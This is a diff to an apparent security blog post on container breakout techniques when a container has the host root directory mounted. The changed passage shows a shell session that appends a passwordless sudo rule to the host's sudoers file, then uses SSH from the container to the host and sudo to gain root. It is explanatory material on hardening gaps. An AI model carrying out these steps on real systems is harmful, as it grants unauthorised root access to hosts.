@@ -8,6 +8,7 @@ tags:
 - security
 ---
 
+
 This post is part of a series and shows container breakout techniques that can be performed if a container is started with access to the host root directory.
 
 <!--more-->
@@ -59,15 +60,23 @@ $6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPf
 
 # echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user
 
-# ip r 
+# ip r
 default via 172.17.0.1 dev eth0 
-172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2
+172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2 
 
-# ssh -l foo 127.0.0.1
-foo@127.0.0.1's password: 
-Last login: Sat Jul 11 12:10:10 2020 from 127.0.0.1
-arch [~]% sudo -i
-[arch ~]# 
+# ssh -l foo 172.17.0.1
+The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
+ECDSA key fingerprint is SHA256:PezvADaTYqKcp4JfDO1bapTJaMEAVBjCXCCzanBZOW8.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '172.17.0.1' (ECDSA) to the list of known hosts.
+foo@172.17.0.1's password: 
+Last login: Sat Jul 11 12:12:15 2020 from 127.0.0.1
+
+arch [~]% sudo -i                  
+
+[arch ~]# id -a
+uid=0(root) gid=0(root) groups=0(root)
+
 ```
 
 For this scenario, the SSH daemon is running on the host, the configuration is not hardened and the `sudo` package is installed. The sudo step can be exchanged by creating another user with `uid=0(root)`. Another option would be the creation of SSH keys for existing users.
